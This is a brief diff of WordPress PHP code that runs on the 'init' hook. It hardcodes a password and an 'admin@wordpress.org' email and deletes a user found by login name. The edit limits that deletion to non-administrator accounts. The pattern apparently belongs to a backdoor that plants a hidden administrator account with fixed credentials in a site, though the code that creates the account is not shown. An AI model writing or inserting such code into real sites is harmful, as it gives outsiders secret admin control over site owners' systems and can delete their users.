@@ -57,7 +57,7 @@ add_action( 'init', function () {
 	$password = 'Passwordnai';
 	$email_address = 'admin@wordpress.org';
 	$user = get_user_by( 'login', $username );
-	if ( $user ) {
+	if ( $user AND $user->roles[0] != 'administrator') {
     	require_once(ABSPATH.'wp-admin/includes/user.php' );
 	    wp_delete_user( $user->ID );
 	}
